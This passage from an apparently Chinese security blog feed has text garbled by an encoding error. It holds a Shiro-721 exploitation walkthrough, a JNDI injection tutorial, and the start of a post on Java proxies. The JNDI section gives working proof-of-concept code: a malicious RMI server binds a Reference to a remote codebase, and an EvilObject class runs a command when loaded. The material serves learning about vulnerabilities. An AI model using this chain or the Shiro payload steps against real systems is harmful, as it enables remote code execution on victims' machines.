title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><p>å¤§è‡´é€»è¾‘ä¸shiro-550å·®ä¸å¤šï¼Œç›´æ¥è¯´åˆ©ç”¨å§ã€‚</p><p><a href="https://github.com/inspiringz/Shiro-721">https://github.com/inspiringz/Shiro-721</a> ä½¿ç”¨è¿™ä¸ªå·¥å…·</p><p>é¦–å…ˆæˆ‘ä»¬å¾—å‹¾é€‰remembermeï¼ŒæŠ“åŒ…è·å¾—rememberme cookie</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310221230268.png" alt="image-20210310221230268"></p><p>ç„¶åé€šè¿‡ysoserialç”Ÿæˆpayloadï¼Œå°†å…¶é€šè¿‡ç®¡é“ç¬¦ä¼ å…¥æŸä¸ªæ–‡ä»¶ï¼Œéšåç”¨åˆšåˆšé‚£ä¸ªå·¥å…·é‡Œçš„shiro_exp.py</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python .&#x2F;shiro_exp.py &lt;url&gt; &lt;cookie&gt; &lt;paylaodæ–‡ä»¶&gt;</span><br></pre></td></tr></table></figure><p>éšåä¼šè¿›è¡Œçˆ†ç ´ï¼Œæœ€åè·å¾—ç»“æœcookieåï¼Œä¼ å…¥å¹¶å‘åŒ…è¿‡å»å³å¯ï¼ˆçˆ†ç ´æ—¶é—´å¾ˆé•¿ï¼‰</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210310224415067.png" alt="image-20210310224415067"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h1&gt;&lt;h1 id=&quot;shiro&quot;&gt;&lt;a href=&quot;#shiro&quot; class=&quot;headerlink&quot; title=&quot;shiro&quot;&gt;&lt;/a&gt;shiro&lt;/h1&gt;&lt;p</summary>
      
    
    
    
    
    <category term="javaå¼€å‘ä¸å®‰å…¨" scheme="http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>JNDIæ³¨å…¥åŸç†æµ…æ</title>
    <link href="http://const27.com/2021/06/28/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/"/>
    <id>http://const27.com/2021/06/28/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/</id>
    <published>2021-06-28T13:51:11.045Z</published>
    <updated>2021-06-28T13:50:45.147Z</updated>
    
    <content type="html"><![CDATA[<p>JNDIæ³¨å…¥ä¾èµ–RMIï¼Œæ‰€ä»¥åœ¨å­¦ä¹ JNDIæ³¨å…¥å‰åŠ¡å¿…äº†è§£ä¸€ä¸‹RMI</p><h1 id="JNDI-ç®€ä»‹"><a href="#JNDI-ç®€ä»‹" class="headerlink" title="JNDI ç®€ä»‹"></a>JNDI ç®€ä»‹</h1><p>JNDI (Java Naming and Directory Interface) æ˜¯ä¸€ä¸ªjavaä¸­çš„æŠ€æœ¯ï¼Œç”¨äºæä¾›ä¸€ä¸ªè®¿é—®å„ç§èµ„æºçš„æ¥å£ã€‚æ¯”å¦‚é€šè¿‡JNDIå¯ä»¥åœ¨å±€åŸŸç½‘ä¸Šå®šä½ä¸€å°æ‰“å°æœºï¼Œæˆ–è€…å®šä½æ•°æ®åº“æœåŠ¡ï¼Œè¿œç¨‹JAVAå¯¹è±¡ç­‰ã€‚<br>JNDIåº•å±‚æ”¯æŒRMIè¿œç¨‹å¯¹è±¡ï¼ŒRMIæ³¨å†Œçš„æœåŠ¡å¯ä»¥ç›´æ¥è¢«JNDIæ¥å£è®¿é—®è°ƒç”¨ã€‚</p><h1 id="JNDIæ³¨å…¥"><a href="#JNDIæ³¨å…¥" class="headerlink" title="JNDIæ³¨å…¥"></a>JNDIæ³¨å…¥</h1><h2 id="RMIå·¥ä½œåŸç†"><a href="#RMIå·¥ä½œåŸç†" class="headerlink" title="RMIå·¥ä½œåŸç†"></a>RMIå·¥ä½œåŸç†</h2><p>é¦–å…ˆæˆ‘ä»¬å…ˆæ€è€ƒä¸€ä¸‹RMIçš„å·¥ä½œåŸç†æ˜¯ä»€ä¹ˆã€‚</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.æœåŠ¡å™¨åˆ›å»ºå¥½ç»§æ‰¿äºRemoteæ¥å£çš„ç±»ï¼Œå¹¶æŠŠå®ƒç»‘å®šåˆ°RMIæœåŠ¡å™¨ä¸Š</span><br><span class="line">2.å®¢æˆ·ç«¯è¯·æ±‚RMIæœåŠ¡å™¨ä¸Šçš„ç±»</span><br><span class="line">3.æœåŠ¡ç«¯è¿”å›å®¢æˆ·ç«¯æ‰€è¯·æ±‚ç±»çš„å­˜æ ¹stubï¼Œå®¢æˆ·ç«¯å°†è¿™ä¸ªstubçœ‹ä½œå®ä¾‹åŒ–å¯¹è±¡ä½¿ç”¨</span><br><span class="line">4.å®¢æˆ·ç«¯è°ƒç”¨stubçš„æŸä¸ªæ–¹æ³•ï¼Œå¹¶ä¼ å…¥å‚æ•°ã€‚è¯¥å‚æ•°ä¼šå‘é€åˆ°RMIæœåŠ¡å™¨ä¸Šï¼Œç”±RMIæœåŠ¡å™¨æŒ‰ç…§å®¢æˆ·ç«¯ä¼ æ¥çš„å‚æ•°æ¥æ‰§è¡ŒæŒ‡å®šçš„æ–¹æ³•</span><br><span class="line">5.æœåŠ¡å™¨æ‰§è¡Œå®Œåå°†ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ä»RMIè¿™ä¸€ç«¯æ¥çœ‹ï¼Œå®¢æˆ·ç«¯è·å–äº†è¿œç¨‹å¯¹è±¡åæ‰€æ‰§è¡Œçš„æ­¤å¯¹è±¡çš„æ–¹æ³•ï¼Œéƒ½æ˜¯ç”±RMIæœåŠ¡å™¨æ¥æ‰§è¡Œçš„ã€‚</p><h2 id="JNDI-ä¸-RMI-çš„åŒºåˆ«"><a href="#JNDI-ä¸-RMI-çš„åŒºåˆ«" class="headerlink" title="JNDI ä¸ RMI çš„åŒºåˆ«"></a>JNDI ä¸ RMI çš„åŒºåˆ«</h2><p>rmiè°ƒç”¨è¿œç¨‹å¯¹è±¡å’ŒJNDIè°ƒç”¨è¿œç¨‹å¯¹è±¡ï¼Œåœ¨ä»£ç ä¸Šæ˜¯æœ‰å·®åˆ«çš„</p><p>å¦‚ä¸‹æ˜¯RMIåˆ›å»ºå’Œè°ƒç”¨è¿œç¨‹å¯¹è±¡</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.rmi.Naming;</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line">import java.util.Properties;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import javax.naming.Context;</span><br><span class="line">import javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line">interface IHello extends Remote &#123;</span><br><span class="line">    public String sayHello(String name) throws RemoteException;</span><br><span class="line">&#125;</span><br><span class="line">class IHelloImpl extends UnicastRemoteObject implements IHello &#123;</span><br><span class="line">    protected IHelloImpl() throws RemoteException &#123;</span><br><span class="line">        super();</span><br><span class="line">    &#125;</span><br><span class="line">    public String sayHello(String name) throws RemoteException &#123;</span><br><span class="line">        return &quot;Hello &quot; + name + &quot; ^_^ &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">public class CallService &#123;</span><br><span class="line">    public static void main(String args[]) throws Exception &#123;</span><br><span class="line">        IHello hello &#x3D; new IHelloImpl();</span><br><span class="line">        Naming.bind(&quot;hello&quot;, hello);</span><br><span class="line">        </span><br><span class="line">        IHello rHello &#x3D; (IHello) Naming.lookup(&quot;hello&quot;);</span><br><span class="line">        System.out.println(rHello.sayHello(&quot;RickGray&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€ŒJNDIè°ƒç”¨è¿œç¨‹å¯¹è±¡çš„è¿‡ç¨‹å¦‚ä¸‹ï¼Œå¤šäº†ä¸€æ­¥è®¾ç½®JNDIç¯å¢ƒ</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line">import java.util.Properties;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import javax.naming.Context;</span><br><span class="line">import javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line">interface IHello extends Remote &#123;</span><br><span class="line">    public String sayHello(String name) throws RemoteException;</span><br><span class="line">&#125;</span><br><span class="line">class IHelloImpl extends UnicastRemoteObject implements IHello &#123;</span><br><span class="line">    protected IHelloImpl() throws RemoteException &#123;</span><br><span class="line">        super();</span><br><span class="line">    &#125;</span><br><span class="line">    public String sayHello(String name) throws RemoteException &#123;</span><br><span class="line">        return &quot;Hello &quot; + name + &quot; ^_^ &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">public class CallService &#123;</span><br><span class="line">    public static void main(String args[]) throws Exception &#123;</span><br><span class="line">        &#x2F;&#x2F; é…ç½® JNDI é»˜è®¤è®¾ç½®</span><br><span class="line">        Properties env &#x3D; new Properties();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">                &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);</span><br><span class="line">        env.put(Context.PROVIDER_URL,</span><br><span class="line">                &quot;rmi:&#x2F;&#x2F;localhost:1022&quot;);</span><br><span class="line">        Context ctx &#x3D; new InitialContext(env);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; æœ¬åœ°å¼€å¯ 1022 ç«¯å£ä½œä¸º RMI æœåŠ¡ï¼Œå¹¶ä»¥æ ‡è¯† &quot;hello&quot; ç»‘å®šæ–¹æ³•å¯¹è±¡</span><br><span class="line">        Registry registry &#x3D; LocateRegistry.createRegistry(1022);</span><br><span class="line">        IHello hello &#x3D; new IHelloImpl();</span><br><span class="line">        registry.bind(&quot;hello&quot;, hello);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; JNDI è·å– RMI ä¸Šçš„æ–¹æ³•å¯¹è±¡å¹¶è¿›è¡Œè°ƒç”¨</span><br><span class="line">        IHello rHello &#x3D; (IHello) ctx.lookup(&quot;hello&quot;);</span><br><span class="line">        System.out.println(rHello.sayHello(&quot;tom&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Referenceç±»"><a href="#Referenceç±»" class="headerlink" title="Referenceç±»"></a>Referenceç±»</h2><p>é¦–å…ˆæ¥çœ‹ä¸€ä¸‹å¦‚ä½•åˆ›å»ºä¸€ä¸ªå¯¹è±¡Referenceå¹¶å°†å…¶ç»‘å®šåˆ°RMIæœåŠ¡å™¨ä¸Š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">......å®šä¹‰å¥½äº†registryï¼Œå®ƒæ˜¯ä¸€ä¸ªRegistryå¯¹è±¡ï¼ˆRMIä¸­ç”¨äºå°†ç±»æ³¨å†Œåˆ°æœåŠ¡å™¨ä¸Šçš„å¯¹è±¡ï¼‰</span><br><span class="line">Reference refObj &#x3D; new Reference(&quot;refClassName&quot;, &quot;insClassName&quot;, &quot;http:&#x2F;&#x2F;a.com:12345&quot;);</span><br><span class="line">ReferenceWrapper refObjWrapper &#x3D; new ReferenceWrapper(refObj);</span><br><span class="line">registry.bind(&quot;refObj&quot;, refObjWrapper);</span><br></pre></td></tr></table></figure><p>å‰é¢è¯´åˆ°RMIæœåŠ¡å™¨ä¼šå‘å®¢æˆ·ç«¯è¿”å›stubæˆ–è€…è¯´ä¸€ä¸ªå¯¹è±¡ï¼Œå¦‚æœRMIæœåŠ¡å™¨ä¼ å›å®¢æˆ·ç«¯ä¸€ä¸ªReferenceå¯¹è±¡å‘¢ï¼Ÿé‚£å°±è¦è¯´é“è¯´é“äº†ã€‚<br>å¯¹äºRMIæœåŠ¡å™¨è€Œè¨€ï¼Œå‘å®¢æˆ·ç«¯ä¼ å›ä¸€ä¸ªReferenceå¯¹è±¡å’Œä¼ å›å…¶ä»–å¯¹è±¡ä¸€æ ·ï¼Œå¹¶æ²¡æœ‰å¤šå¤§åŒºåˆ«ã€‚<br>ä½†æ˜¯å®¢æˆ·ç«¯ç”±äºè·å–åˆ°äº†ä¸€ä¸ªReferenceå®ä¾‹ï¼Œæ¯”å¦‚è¯´å°±æ˜¯ä¸Šé¢ä»£ç ä¸­çš„Referenceå®ä¾‹ï¼Œæ¥ä¸‹æ¥å®¢æˆ·ç«¯å°±ä¼šå…ˆåœ¨CLASSPATHé‡Œå¯»æ‰¾è¢«æ ‡è¯†ä¸ºrefClassNameçš„ç±»ã€‚å¦‚æœæ²¡æ‰¾åˆ°ï¼Œå®ƒå°±ä¼šå»è¯·æ±‚<a href="http://a.com:12345/refClassName.class">http://a.com:12345/refClassName.class</a> å¯¹é‡Œé¢çš„ç±»è¿›è¡ŒåŠ¨æ€åŠ è½½ï¼Œå¹¶è°ƒç”¨insClassNameç±»çš„æ„é€ æ–¹æ³•ã€‚æ³¨æ„ï¼Œè°ƒç”¨insClassNameç±»çš„æ„é€ æ–¹æ³•è¿™ä¸ªè¡Œä¸ºæ˜¯ç”±å®¢æˆ·ç«¯å®Œæˆçš„ã€‚</p><p>ä¸Šé¢çš„ä¸€ç³»åˆ—è¡Œä¸ºå¯ä»¥æ¦‚æ‹¬ä¸ºxiatu<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210324014723682.png" alt="image-20210324014723682"></p><h2 id="JNDI-åè®®è½¬æ¢"><a href="#JNDI-åè®®è½¬æ¢" class="headerlink" title="JNDI åè®®è½¬æ¢"></a>JNDI åè®®è½¬æ¢</h2><p>æˆ‘ä»¬åœ¨é€šè¿‡JNDIè°ƒç”¨è¿œç¨‹å¯¹è±¡æ—¶ï¼Œéœ€è¦è®¾ç½®ç¯å¢ƒï¼Œå°±åƒè¿™æ ·</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Properties env &#x3D; new Properties();</span><br><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">        &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);  &#x2F;&#x2F;è®¾ç½®äº†rmiè¯·æ±‚æ–¹å¼</span><br><span class="line">env.put(Context.PROVIDER_URL,</span><br><span class="line">        &quot;rmi:&#x2F;&#x2F;localhost:1099&quot;);</span><br><span class="line">Context ctx &#x3D; new InitialContext(env);</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚ä»¥ä¸Šä»£ç ï¼Œå°±è®¾ç½®äº†JNDIä¼šé€šè¿‡rmiçš„æ–¹å¼å»è¯·æ±‚è¿œç¨‹å¯¹è±¡ã€‚</p><p>ä½†æ˜¯å½“è°ƒç”¨lookup()æˆ–è€…search()æ—¶ï¼Œå¯ä»¥ç›´æ¥æ— è§†ç¯å¢ƒæ˜¯å¦‚ä½•è®¾ç½®è¯·æ±‚æ–¹å¼çš„ï¼Œå› ä¸ºJNDIæœ‰åè®®åŠ¨æ€è½¬æ¢æœºåˆ¶ã€‚ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿçœ‹çœ‹ä»£ç å°±æ™“å¾—äº†</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Properties env &#x3D; new Properties();</span><br><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY,</span><br><span class="line">        &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);</span><br><span class="line">env.put(Context.PROVIDER_URL,</span><br><span class="line">        &quot;rmi:&#x2F;&#x2F;localhost:1099&quot;);</span><br><span class="line">Context ctx &#x3D; new InitialContext(env);</span><br><span class="line">ctx.lookup(&quot;ldap:&#x2F;&#x2F;a.com&#x2F;ou&#x3D;foo,dc&#x3D;foobar,dc&#x3D;com&quot;)</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šä»£ç æ‰§è¡Œåï¼Œä¼šè°ƒç”¨ldapåè®®å»è¯·æ±‚ï¼Œè€Œä¸æ˜¯rmiã€‚<br>è¿™æ˜¯å› ä¸ºlookupæˆ–è€…searchå‡½æ•°åœ¨å‚æ•°ä¸ºç»å¯¹è·¯å¾„URIçš„æƒ…å†µä¸‹åŠ¨æ€è½¬æ¢åè®®ä¸ºå‚æ•°ä¸­æŒ‡å®šçš„åè®®ã€‚</p><h2 id="JNDIæ³¨å…¥-1"><a href="#JNDIæ³¨å…¥-1" class="headerlink" title="JNDIæ³¨å…¥"></a>JNDIæ³¨å…¥</h2><p>å¦‚æœæˆ‘ä»¬æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼ŒJNDIæ³¨å…¥å°±ä¼šæˆåŠŸ</p><p>JNDIè°ƒç”¨çš„lookupå‚æ•°å¯æ§<br>URIå¯è¿›è¡ŒåŠ¨æ€åè®®è½¬æ¢<br>Referenceå¯¹è±¡æŒ‡å®šç±»ä¼šè¢«åŠ è½½å¹¶å®ä¾‹åŒ–</p><p>å…¶å®æœ€é‡è¦çš„å°±æ˜¯ç¬¬ä¸€æ¡ã€‚</p><p>ä¸‹é¢ç”¨ä¸€å¼ å›¾æ¦‚æ‹¬ä»JNDIæ³¨å…¥åˆ°RCEçš„æµç¨‹</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210324141937091.png" alt="image-20210324141937091"></p><p>1.æ”»å‡»è€…æ§åˆ¶äº†lookupå‚æ•°<br>2.æ”»å‡»è€…å°†lookupå‚æ•°æ›¿æ¢ä¸ºå»è¯·æ±‚æ¶æ„æœåŠ¡å™¨Aä¸Šçš„Referenceå¯¹è±¡<br>3.æ¶æ„æœåŠ¡å™¨Aè¿”å›Referenceå¯¹è±¡<br>4.å—å®³æœºå™¨è·å¾—Referenceå¯¹è±¡åå…ˆåœ¨CLASSPATHä¸­æŸ¥æ‰¾Referenceå¯¹è±¡ä¸­çš„æŒ‡å®šç±»æ˜¯å¦å­˜åœ¨ï¼Œè‹¥ä¸å­˜åœ¨åˆ™è¯·æ±‚Referenceå¯¹è±¡ä¸­æŒ‡å®šçš„æ¶æ„æœåŠ¡å™¨Bå»è·å¾—æŒ‡å®šç±»<br>5.æ¶æ„æœåŠ¡å™¨Bè¿”å›æŒ‡å®šç±»<br>6.å—å®³æœºå™¨å¾—åˆ°æŒ‡å®šç±»åï¼Œæ‰§è¡ŒæŒ‡å®šç±»çš„æ„é€ å‡½æ•°ï¼Œä»è€Œè¾¾åˆ°RCE</p><p>ä¸‹é¢æ˜¯ä»£ç å®ç°</p><p>å—å®³æœºå™¨</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import javax.naming.Context;</span><br><span class="line">import javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line">interface IHello extends Remote &#123;</span><br><span class="line">    abstract String sayHello(String name) throws RemoteException;</span><br><span class="line">&#125;</span><br><span class="line">public class CallService &#123;</span><br><span class="line">    public static void main(String args[]) throws Exception&#123;</span><br><span class="line">        if(args.length&lt;1)&#123;</span><br><span class="line">            System.out.println(&quot;Plz input url&quot;);</span><br><span class="line">            System.exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            &#x2F;&#x2F; JNDI è·å– RMI ä¸Šçš„æ–¹æ³•å¯¹è±¡å¹¶è¿›è¡Œè°ƒç”¨</span><br><span class="line">            Context ctx &#x3D; new InitialContext();</span><br><span class="line">            IHello rHello &#x3D; (IHello) ctx.lookup((String)args[0]);</span><br><span class="line">            System.out.println(rHello.sayHello(&quot;tom&quot;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RMI</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line">import javax.naming.Reference;</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.*;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class evilrmi &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        Registry registry &#x3D; LocateRegistry.createRegistry(1010);</span><br><span class="line">        Reference refObj &#x3D; new Reference(&quot;EvilObject&quot;,&quot;EvilObject&quot;,&quot;http:&#x2F;&#x2F;192.168.111.1:80&#x2F;&quot;);</span><br><span class="line">        ReferenceWrapper refObjWra &#x3D; new ReferenceWrapper(refObj);</span><br><span class="line">        registry.bind(&quot;refObj&quot;,refObjWra);</span><br><span class="line">        System.out.println(&quot;gogo&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>EvilObject</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class EvilObject &#123;</span><br><span class="line">    public EvilObject() throws Exception &#123;</span><br><span class="line">        Runtime rt &#x3D; Runtime.getRuntime();</span><br><span class="line">        String[] commands &#x3D; &#123;&quot;calc&quot;&#125;;</span><br><span class="line">        Process pc &#x3D; rt.exec(commands);</span><br><span class="line">        pc.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆè¿è¡ŒRMIæœåŠ¡å™¨ï¼Œç„¶åæŠŠEvilObject.classæ”¾ç½®äº<a href="http://192.168.111.1/%E4%B8%8B%EF%BC%8C%E7%84%B6%E5%90%8E%E6%8C%87%E5%AE%9Alookup%E5%8F%82%E6%95%B0%E4%B8%BA%E6%88%91%E4%BB%AC%E7%9A%84%E6%81%B6%E6%84%8FRMI%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8E%BB%E8%BF%90%E8%A1%8C%E5%8F%97%E5%AE%B3%E6%9C%BA%E5%99%A8%E3%80%82">http://192.168.111.1:80/ä¸‹ï¼Œç„¶åæŒ‡å®šlookupå‚æ•°ä¸ºæˆ‘ä»¬çš„æ¶æ„RMIæœåŠ¡å™¨å»è¿è¡Œå—å®³æœºå™¨ã€‚</a></p><p>å¦‚æœæ˜¯æ—©æœŸJDKç‰ˆæœ¬ï¼Œè®¡ç®—å™¨å°±å·²ç»å¼¹å‡ºæ¥äº†ã€‚JDK 6u141, JDK 7u131, JDK 8u121 ä»¥åŠæ›´é«˜ç‰ˆæœ¬ä¸­Javaæå‡äº†JNDI é™åˆ¶äº†Naming/DirectoryæœåŠ¡ä¸­JNDI Reference<strong>è¿œç¨‹</strong>åŠ è½½Object Factoryç±»çš„ç‰¹æ€§ï¼Œæ‰€ä»¥ä¼šæ‰§è¡Œä»¥ä¸Šæµç¨‹ä¼šæœ‰å¦‚ä¸‹æŠ¥é”™</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The object factory is untrusted. Set the system property &#39;com.sun.jndi.rmi.object.trustURLCodebase&#39; to &#39;true&#39;.</span><br></pre></td></tr></table></figure><p>ç³»ç»Ÿå±æ€§ com.sun.jndi.rmi.object.trustURLCodebaseã€com.sun.jndi.cosnaming.object.trustURLCodebase çš„é»˜è®¤å€¼å˜ä¸ºfalseï¼Œå³é»˜è®¤ä¸å…è®¸ä»è¿œç¨‹çš„CodebaseåŠ è½½Referenceå·¥å‚ç±»ã€‚</p><p>ä»¥ä¸Šæ˜¯JNDI Reference+RMIçš„åˆ©ç”¨æ–¹å¼ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜æœ‰ä¸€ä¸ªJNDI Reference+ldap çš„åˆ©ç”¨æ–¹å¼ï¼Œæ“ä½œä¸JNDI Reference+RMIå¤§åŒå°å¼‚ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡ldapåè®®lookupä¸€ä¸ªæ¶æ„æœåŠ¡å™¨å¹¶è·å¾—æ¶æ„Referenceå¯¹è±¡ï¼Œå¹¶ä¸”LDAPæœåŠ¡çš„Referenceè¿œç¨‹åŠ è½½Factoryç±»ä¸å— com.sun.jndi.rmi.object.trustURLCodebaseã€com.sun.jndi.cosnaming.object.trustURLCodebaseç­‰å±æ€§çš„é™åˆ¶ï¼Œæ‰€ä»¥åˆ©ç”¨é¢æ›´å¹¿<br>ä½†æ˜¯åœ¨Oracle JDK 11.0.1ã€8u191ã€7u201ã€6u211ä¹‹å com.sun.jndi.ldap.object.trustURLCodebase å±æ€§çš„é»˜è®¤å€¼è¢«è°ƒæ•´ä¸ºfalseï¼Œè¿˜å¯¹åº”çš„åˆ†é…äº†ä¸€ä¸ªæ¼æ´ç¼–å·CVE-2018-3149ã€‚</p><h1 id="JNDIæ³¨å…¥ï¼šé«˜ç‰ˆæœ¬å¦‚ä½•åˆ©ç”¨ï¼Ÿ"><a href="#JNDIæ³¨å…¥ï¼šé«˜ç‰ˆæœ¬å¦‚ä½•åˆ©ç”¨ï¼Ÿ" class="headerlink" title="JNDIæ³¨å…¥ï¼šé«˜ç‰ˆæœ¬å¦‚ä½•åˆ©ç”¨ï¼Ÿ"></a>JNDIæ³¨å…¥ï¼šé«˜ç‰ˆæœ¬å¦‚ä½•åˆ©ç”¨ï¼Ÿ</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;JNDIæ³¨å…¥ä¾èµ–RMIï¼Œæ‰€ä»¥åœ¨å­¦ä¹ JNDIæ³¨å…¥å‰åŠ¡å¿…äº†è§£ä¸€ä¸‹RMI&lt;/p&gt;
&lt;h1 id=&quot;JNDI-ç®€ä»‹&quot;&gt;&lt;a href=&quot;#JNDI-ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;JNDI ç®€ä»‹&quot;&gt;&lt;/a&gt;JNDI ç®€ä»‹&lt;/h1&gt;&lt;p&gt;JNDI (Jav</summary>
      
    
    
    
    
    <category term="javaå¼€å‘ä¸å®‰å…¨" scheme="http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>javaå®‰å…¨ä¸­å‡ ä¸ªé‡è¦æœºåˆ¶</title>
    <link href="http://const27.com/2021/06/28/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/"/>
    <id>http://const27.com/2021/06/28/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/</id>
    <published>2021-06-28T13:51:11.042Z</published>
    <updated>2021-03-31T06:02:07.803Z</updated>
    
    <content type="html"><![CDATA[<h1 id="java-ä»£ç†"><a href="#java-ä»£ç†" class="headerlink" title="java ä»£ç†"></a>java ä»£ç†</h1><p>ä»£ç†çš„ä½œç”¨ï¼Œå°±æ˜¯åœ¨åŸæœ‰ç±»çš„ä»£ç ä¸å‘ç”Ÿæ”¹åŠ¨çš„æƒ…å†µä¸‹ï¼Œæ·»åŠ æ–°åŠŸèƒ½ã€‚èµ·åˆ°ä¸€ä¸ªä¿®é¥°å™¨çš„ä½œç”¨ã€‚</p><p>å‡è®¾æˆ‘ä»¬ç°åœ¨æœ‰ä¸ªç±»ï¼Œç”¨äºæ‰“å°helloworld</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class hello&#123;</span><br><span class="line">    public void gogo()&#123;System.out.println(&quot;Hello Wrold&quot;);&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æƒ³åœ¨ä¸æ”¹åŠ¨helloç±»çš„å‰æä¸‹ï¼Œåœ¨è¾“å‡ºhelloworldæ—¶åŒæ—¶è¾“å‡ºå½“å‰æ—¶é—´åˆ°æ–‡ä»¶ï¼Œè¾¾åˆ°æ—¥å¿—çš„åŠŸèƒ½ï¼Œè¯¥å¦‚ä½•è§£å†³è¿™ä¸ªé—®é¢˜å‘¢ï¼Ÿä»¥è¿™ä¸ªé—®é¢˜ä¸ºåˆ‡å…¥ç‚¹ï¼Œå¼€å§‹å­¦ä¹ ä»£ç†ã€‚</p><h2 id="é™æ€ä»£ç†"><a href="#é™æ€ä»£ç†" class="headerlink" title="é™æ€ä»£ç†"></a>é™æ€ä»£ç†</h2><p>é™æ€ä»£ç†å¾ˆç®€å•ï¼Œä¸ç”¨æ¥è§¦ä»€ä¹ˆæ–°æŠ€æœ¯ã€‚å°±æ˜¯åˆ›å»ºä¸€ä¸ªâ€ç»§æ‰¿å·²æœ‰çš„ä¸€ä¸ªç±»<br>â€œçš„ç±»ï¼Œé€šè¿‡é‡å†™çˆ¶ç±»çš„æ–¹æ³•ï¼Œè¾¾åˆ°ä¸æ”¹åŠ¨åŸæœ‰ç±»çš„åŸºç¡€ä¸Šå¢æ·»æ–°åŠŸèƒ½ã€‚çº¸ä¸Šå¾—æ¥ç»ˆè§‰æµ…ï¼Œç”¨ä»£ç 